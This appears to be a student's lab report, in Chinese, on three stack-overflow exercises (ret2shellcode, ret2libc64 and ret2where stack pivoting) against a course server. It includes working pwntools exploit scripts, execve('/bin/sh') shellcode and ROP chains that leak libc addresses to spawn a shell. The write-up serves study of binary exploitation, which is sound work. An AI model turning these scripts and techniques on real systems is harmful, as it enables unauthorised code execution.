解雲暄	3190105871

### 01 ret2ShellcodeAgain
观察到源代码有 `gets()`，因此可以攻击！

通过 checksec 观察到程序没有开启 NX 保护：
![image.png](./assets/1649234604106-4a3cd8fc-39b8-44dc-a522-2a45f321bb89.png)
因此可以在栈上搞点东西来运行。

通过 gdb 研究栈结构：
![image.png](./assets/1649222382621-dbfae51a-b767-48ba-a273-df8662571282.png)
![image.png](./assets/1649223599955-6bf5e918-e8fc-4135-978b-307d1f9b0e53.png)
可以分析出栈结构大致如下：
![image.png](./assets/1649261695508-bad186b0-5dad-4c68-b25f-922f147a7aaa.png)
（`leave` 的作用是 `mov rsp, rbp    pop rbp`，即从栈上拿 `rbp`来将`rsp`调整到调用前的位置上。）

同时可以注意到，每次运行中栈的位置是不同的，因此 ret addr 的值不能简单地写成字面量。但是程序会给出 name 保存的地址信息，因此我们可以根据偏移量计算注入的地址：
![image.png](./assets/1649222422668-5e2d3e69-24bc-4eec-b3a0-e0eb5f41e87e.png)
即，`target = int(storeRecv[-13:], 16)`，其中 `storeRecv` 是接收到的这个输出。<br />`<br />下面构造 shellcode。我们在这里 [http://shell-storm.org/shellcode/files/shellcode-603.php](http://shell-storm.org/shellcode/files/shellcode-603.php) 找到了一个看起来能用的 shellcode：
```
xor     rdx, rdx
mov     qword rbx, '//bin/sh'
shr     rbx, 0x8
push    rbx
mov     rdi, rsp
push    rax
push    rdi
mov     rsi, rsp
mov     al, 0x3b
syscall
```

尝试编写代码并运行，发现一些问题；例如这样栈的增长会覆盖我们的 shellcode 本身。因此我们给 shellcode 增加 `sub	rsp, 48` 从而避开我们的 shellcode。
![image.png](./assets/1649231989628-a60ef3af-770a-4137-9e08-08295be012fe.png)

最终我们编写脚本得到 flag：
![image.png](./assets/1649234456203-1554066d-2a92-4c59-bf21-dff762e98de1.png)

这是我们最后使用的脚本：
```python
from pwn import *
context(arch = 'x86_64', os = 'linux')
context.log_level = 'DEBUG'
conn = remote("116.62.228.23", 10300)

conn.recvuntil("Please input your StudentID:\n")
conn.sendline("3190105871")
conn.recvuntil("name:\n")
conn.sendline("xyx")

shellcode = """
        sub	    rsp, 48
        xor     rdx, rdx
        mov     rbx, 0x68732f6e69622f2f
        shr     rbx, 0x8
        push    rbx
        mov     rdi, rsp
        push    rax
        push    rdi
        xor	    rsi, rsi
        xor	    rax, rax
        mov     al, 0x3b
        syscall
"""

shellcode = asm(shellcode)
shellcode += b'0' * (0xc8 - 0xa0 - int(size(shellcode)[:-1]))


conn.recvline()
storeRecv = str(conn.recvline(), 'UTF-8')

target = int(storeRecv[-13:], 16)
conn.recvuntil("overflow me!\n")
conn.sendline(shellcode + p64(target))

conn.sendline("./flag.exe 3190105871")
conn.interactive()
```

下面对 shellcode 进行分析：
```
sub	    rsp, 48							
xor     rdx, rdx
mov     rbx, 0x68732f6e69622f2f
shr     rbx, 0x8
push    rbx
mov     rdi, rsp
push    rax
push    rdi
xor	    rsi, rsi
xor	    rax, rax
mov     al, 0x3b
syscall
```

- 第 1 行，如前所述，调整 `rsp` 防止栈的增长覆盖 shellcode
- x64 程序依次通过通过 `rdi`, `rsi`, `rdx`, `rcx`, `r8`, `r9` 这些寄存器传递参数，调用号存在 `al` 中。由于 execve 需要 3 个参数，因此使用前三个。
   - 第 3 行，我们将 `'//bin/sh'` 赋值给 `rbx`，并在第 4 行将其左移 8 位，从而在最后一个字节留出一个 `0` 来表示字符串的结束；随即在第 5 行我们将其压到栈上，并在第 6 行将此时 `rsp` 的地址赋值给 `rdi` 作为参数，在第 8 行压栈。
   - 第 9 行，我们将 `rsi` 值置为 0。
   - 第 2 行，我们将 `rdx` 值置为 0。
   - 第 7 行我们将 `rax` 压栈，在第 10 行清空 `rax` 的值，然后将 `0x3b` 赋值给 `al` 作为调用号。
   - 我们实际上执行了`execve("/bin/sh", 0, NULL)` 


### 02 ret2libc64
观察到源代码有 `read()`，而且大小比缓冲区大小大一点，因此可能可以攻击！

通过 checksec 注意到开启了 NX 保护，通过 ldd 发现有用库：
![image.png](./assets/1649255120622-0b078657-5f4f-4dc7-9d29-eb4988d8e21d.png)

所以现在我们需要找一些相关的数据，比如：

- 找到 puts，从而定位 lib 的偏移量
- 找到 system，从而调用 `system('/bin/sh')`

我们通过 readelf 定位这些内容。
![image.png](./assets/1649257836399-a83fd464-bd00-4624-9cbc-d410f05b29ea.png)

另外，上述两个函数都是传递 1 个参数的，根据第 1 题中我们的讨论，这个参数将通过 `rdi` 传递。因此我们需要找到使用 `rdi` 的 gadget，可以使用 ROPgadret 工具：  
![image.png](./assets/1649265476126-db5cc4e8-49f0-4133-8398-236953cd33e6.png)
再找一个直接 `ret` 的：
![image.png](./assets/1649265456086-525cb079-0a5c-4a7f-a261-4093978b5127.png)

另外我们还需要找一个 `'/bin/sh'`，可以使用 strings：
![image.png](./assets/1649259145125-ac8982f2-efa1-428c-aa4f-d8fb14bea38a.png)


即，我们的大体步骤是：

1. 构造一次栈溢出使得程序在运行到 `hear()` 的 `ret` 时能够带着正确的参数前往 `puts()` 函数，从而让我们得知 lib 的偏移位置，进一步算出 `system()` 的实际地址；
2. 在 `puts()` 运行结束 `ret`时要能够再跑一遍 `hear()`，从而再构造一次栈溢出使得程序在 `ret` 时能够带着正确的参数前往 `system()` 函数。

`ret`指令即 `pop PC`。

研究一下栈结构：
![image.png](./assets/1649259377204-d55d174c-4f56-44f5-a05a-383d97a36904.png)
偏移 dec8 - dea0 = 40。

第一步的目的是解决 ASLR，即通过 `puts_plt(GOT(puts))` 获取 `puts()` 的实际地址，从而算出库的偏移，进一步算出 `system()` 的实际地址。ref: [https://blog.csdn.net/weixin_43225801/article/details/84779120](https://blog.csdn.net/weixin_43225801/article/details/84779120)

我们可以构造出这样的栈结构：
![image.png](./assets/1649264751089-cac78dc9-5f3c-4a0a-87e4-fb5a07872d56.png)
这样我们获取输出的 `puts()` 的实际地址后，与前面 readelf 找到的地址相减即可得到 lib 的偏移。运行完 `puts` 后该函数返回会再一次来到 `hear()`函数，进行第二步。

对于第二步，尝试构造如下的栈结构：
![image.png](./assets/1649263863102-171c5ff4-522d-4404-b65b-6ff853ca97ec.png)
即，`hear()` 调用 `ret` 时会前往 rdi gadget，即 `pop rdi; ret`：在其中 `pop rdi` 时会将 `'/bin/sh'` 加载到 `rdi` 中；然后调用 `ret` 时会前往 `system()`，即成功运行 shell。

但是经过测试发现出现了段错误。想到了实验指导中的 warning：
![image.png](./assets/1649263836288-aad453ef-1518-4303-acc7-fd1ab4d110d0.png)
因此我们最终构造了如下的栈结构：
![image.png](./assets/1649266724322-20320822-4f6d-4880-afc7-b90ae6849b8b.png)
其实就是相较之前的多了一次 `ret`，本质上没有区别。

编写脚本，得到 flag：
![image.png](./assets/1649266259136-c3c37cc4-6cf0-4dbf-a6d3-ace1a34bcb8a.png)
脚本如下：
```python
from pwn import *

context.log_level = 'DEBUG'

conn = remote("116.62.228.23", 10301)

conn.recvuntil("ID:\n")
conn.sendline("3190105871")

conn.recvuntil("number?\n")
conn.sendline("5")

e = ELF('./02_ret2libc64')
puts_plt = e.symbols['puts']
puts_got = e.got['puts']
hear_addr = e.symbols['hear']
rdi_gadget = 0x401343

payload = b'0'*40 + p64(rdi_gadget) + p64(puts_got) + p64(puts_plt)+ p64(hear_addr)

conn.sendline(payload)
conn.recvuntil("way!\n")

storeRecv = conn.recvline()
puts_addr = u64(storeRecv[:-1]  + b'\x00\x00')

lib_base = puts_addr - 0x875a0

ret_gadget = 0x40101a
binsh = 0x1b75aa + lib_base
system_addr = 0x55410 + lib_base
payload = b'0'*40 + p64(ret_gadget) + p64(rdi_gadget) + p64(binsh)  + p64(system_addr) 
conn.sendline(payload) 

conn.sendline('./flag.exe 3190105871')
conn.interactive()
```


### 03 ret2where
如同第 2 题那样检查信息，唯一不同的是 gadget 的地址：
![image.png](./assets/1649337652426-4862a4f8-fc86-4f10-bba5-7293e53096e2.png)
![image.png](./assets/1649337687197-e609c6c7-81dc-4a21-9a4f-7d5da5c17e0c.png)
分析代码可知，调用 `_coda()` 时的栈如下：
![image.png](./assets/1649306361532-04263a1f-d4d3-4fc9-8577-5b3cf68d0602.png)
其中，`read()`的长度限制使得我们可以写入白色部分的栈区域，但是灰色部分是代码限制我们没有办法写入的。根据第 2 题的思路和过程，我们需要 32 字节的空间，因此我们可以考虑在 `_coda()`中通过修改 saved rbp，在 `leave` 时 `rbp`的值会改为 saved rbp 的值；然后从 `coda()`中 `leave` 时 `rsp`的值会改为 `rbp` 的值，即之前`_coda()`中 saved rbp 的值。使其指向 `name[]`，从而访问 `name[]`中我们的代码。

> `leave`是 `mov rsp, rbp` `pop rbp`
> `ret`是 `pop pc`


在此前我们还需要考虑如何解决 ASLR。根据同学的提示，`welcome()`函数的`printf()`以`%s`输出，如果缓冲区全部为非`'\0'`字符则会继续输出后面的内容；观察上面栈结构可知输出的内容恰好是 `welcome()` 函数的 saved rbp；因此我们在某次运行中记录所有所需地址与当次该处 saved rbp 的偏移，就可以获知所有的地址的实际值。当然，有一定概率在 saved rbp 内部有全 0 字节，因此有一定可能会失败；观察提示即可判定失败是否与此有关。

但是，如果我们尝试以上述方式将 `welcome()` 中的 `name[]` 全部赋值为非 0 字符，我们将很难在其中插入有效的 gadget 等地址。因此我们需要考虑方式重新回到 `welcome()`函数进行输入。我们考虑函数的调用和返回过程：
![image.png](./assets/1649309581026-e24a5183-fb29-4fcb-949e-9c747f8fd97e.png)

1. 调用过程略。其中，在运行到 `welcome()` 时输入全部为非`'\0'`的字符，从而计算各个所需内容的地址。
2. 从 `_coda()` 中 `leave`时，`rsp`一定会更改为当前 `rbp`的值，即指向 `_coda()`的 saved rbp，这是无法调整的；`rsp = &c2`
3. 但是 saved rbp 本身可以调整，这样我们就可以改变这次之后 `rbp` 的值，从而在后面影响 `rsp` 的值；`rbp = c2, rsp = &c3`
4. 从 `_coda()` 中 `ret` 时，`pc`会改为这里 ret addr 的值，这个值是可以修改的；`rsp = &..., pc = c3`
5. 如果 return 到 `coda()`，那么下面进行的就是 `leave`，即将 `rsp` 的值更改为 `rbp` 的值，亦即之前 saved rbp 的值；`rsp = c2`
6. 然后发生一次出栈，`rbp` 的值会被改为此时栈顶的值，而此时的栈的位置是我们可以控制的；`rbp = *c2, rsp = c2 - 1`
7. 然后进行的就是 `ret`，这时候程序取当前栈顶的地址跳转过去；`pc = *(c2 - 1)`
8. 至此，我们可以掌控 `rbp`, `rsp` 和 `pc`。我们希望能在上述 5~7 步将控制流转到 `welcome()` 或者 `_coda()` 以便再一次用 `read()` 输入我们的 ROPChain。考虑到 `_coda()` 在 `read()` 后会直接 `leave` ，因此我们能够使用的空间其实只有 16 字节，这是不够的；而 `welcome()`会调用 `coda()`进而调用 `_coda()`，这给我们了一定的操作空间。
9. 我们试图将控制流转到 `welcome()`。首先我们可以将 ret addr 改为 `<welcome + 5>`，即跳过了 `push rbp`。这样做的原因是为了满足栈的对齐要求，否则后续运行会出现段错误。如果我们要覆盖 ret addr，那么也势必需要给 saved rbp 赋一个值，这个值其实区别并不大，只是影响 `name[]`后续被放在什么地方，进一步影响我们注入的其他地址。我们这里让 saved rbp 为 `str[16]`的地址。
10. 控制流转到 `welcome()`后，在 `welcome()` 中进一步修改 `name[]` 为与第 2 题中第一次注入的内容相似的内容。`welcome()`调用`coda()`进而调用`_coda()`，在 `_coda()`中我们修改 saved rbp，使得后续运行 `leave`、`ret` 到 `coda()` 的剩余代码并经过`leave`后的 `rsp`指向 `name[]`的基地址，然后运行 `ret`就可以实现类似第 2 题的调用了。
11. 调用完 `puts(GOT(puts))`后返回到 `<welcome+5>` 再做一次 ROP，这时我们就可以调用 `system("/bin/sh")`了。

即，我们构造了这样的栈结构：<br />![61BE0DCB397584F6E5894ED77D09DE4C.png](./assets/1649344526390-9741fb69-0e72-435a-8b37-90e516df3ac4.png)
也就是这样：
![image.png](./assets/1649349696092-13f3029d-ce4b-4e27-8349-1831ec6fcf38.png)

编写脚本，得到正确结果：
![image.png](./assets/1649342296216-4dc55927-073a-4da4-b076-a55eb17a951b.png)

```python
from pwn import *

context.log_level = 'DEBUG'

conn = remote("116.62.228.23", 10303)
#conn = gdb.debug('./03_ret2where', 'b _coda')
#conn = gdb.debug('./03_ret2where', 'b *0x40125d')

conn.recvuntil("ID:\n")
conn.sendline("3190105871")

e = ELF('./03_ret2where')
puts_plt = e.symbols['puts']
puts_got = e.got['puts']
_coda_addr = e.symbols['_coda']
welcome_addr = 0x401263 
rdi_gadget = 0x401383

print("===== step 1 === get offset =====")

conn.recvuntil('please?\n')	# welcome, name

payload = b'0' * 0x20
conn.send(payload)

storeRecv = conn.recvline()
print(b"debug " + storeRecv[44:50])
welcome_rbp = u64(storeRecv[44:50]  + b'\x00\x00')
print("rbp addr: " + hex(welcome_rbp))

print("===== step 2 === jump from _coda() to welcome() =====")

conn.recvuntil('to say?\n')	# _coda, str

test_rbp = 0x7ffca19a2180
test_str = 0x7ffca19a20b0
print("str base: " + hex(test_str - test_rbp + welcome_rbp))
str_base = test_str - test_rbp + welcome_rbp

payload = b'0'*16 + p64(str_base + 16) + p64(welcome_addr)
conn.send(payload)

print("===== step 3 === put ROPchain #1 in name[] =====")

conn.recvuntil('please?\n')	# welcome, name

payload = p64(rdi_gadget) + p64(puts_got) + p64(puts_plt)+ p64(welcome_addr)
conn.send(payload)

print("===== step 4 === stack migration #1 get libc offset =====")

conn.recvuntil('to say?\n')	# _coda, str

payload = b'0'*16 + p64(str_base - 8)
conn.send(payload)

storeRecv = conn.recvline()
puts_addr = u64(storeRecv[:-1]  + b'\x00\x00')

lib_base = puts_addr - 0x875a0

print("===== step 5 === put ROPchain #2 in name[] =====")

conn.recvuntil('please?\n')	# welcome, name

ret_gadget = 0x40101a
binsh = 0x1b75ab + lib_base
system_addr = 0x55410 + lib_base

payload = p64(rdi_gadget) + p64(binsh) + p64(system_addr) 
conn.send(payload) 

print("===== step 6 === stack migration #2 run system() =====")

conn.recvuntil('to say?\n')	# _coda, str

payload = b'0'*16 + p64(str_base - 8)
conn.send(payload)

print("===== successful ! QWQ =====")

conn.sendline('./flag.exe 3190105871')
conn.interactive()
```
